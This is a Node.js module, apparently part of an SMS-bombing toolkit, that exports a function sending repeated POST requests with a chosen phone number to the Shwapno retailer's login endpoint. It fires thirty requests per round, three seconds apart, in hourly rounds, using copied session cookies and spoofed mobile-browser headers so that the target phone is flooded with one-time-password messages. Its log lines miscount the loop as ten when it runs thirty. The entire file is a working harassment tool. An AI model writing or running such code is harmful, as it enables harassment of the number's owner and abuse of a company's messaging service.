const axios = require("axios");

async function shopno(number, limit) {
  for (let round = 0; round < limit; round++) {
    console.log(`▶ Round ${round + 1}/${limit} started`);

    for (let i = 0; i < 30; i++) {
      try {
        const response = await axios.post(
  'https://www.shwapno.com/api/auth',
  {
    'phoneNumber': `+88${number}`
  },
  {
    headers: {
      'authority': 'www.shwapno.com',
      'accept': '*/*',
      'accept-language': 'en-US,en;q=0.9',
      'content-type': 'application/json',
      'cookie': '_nc_=true; _ds_=65eb62a4452e887cd78e256b; _fbp=fb.1.1748085361600.856207968251780767; lang=en; cuid=bde95192-5ad7-4d3f-928a-6e783b5c3992; twk_idm_key=g8V9N8qody1eMMLFsn5_h; TawkConnectionTime=0; _gcl_au=1.1.1214264854.1750986983; _ga=GA1.1.1618844855.1750986984; _ga_3R50MQ1P3H=GS2.1.s1750986983$o1$g0$t1750986989$j54$l0$h0',
      'origin': 'https://www.shwapno.com',
      'referer': 'https://www.shwapno.com/kurkure-american-style-cream-and-onion-chips-805gm?lang=en&srsltid=AfmBOopZznKghmgcPVjdUeT3mshRAnk775te-e_SYxXvc9NywzKB-plZ',
      'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-origin',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
    }
  }
);
        
        console.log(`[${i + 1}/10] shopno Sent to ${number} | Response:`, response.data);
      } catch (error) {
        console.error(`[${i + 1}/10] shopno Failed:`, error.message);
      }

      await new Promise(resolve => setTimeout(resolve, 3000));
    }

    if (round < limit - 1) {
      console.log(`⏳ Waiting 1 hours before next round...`);
      await new Promise(resolve => setTimeout(resolve, 3600000));
    }
  }

  console.log("✅ All rounds completed.");
}

module.exports = { shopno };
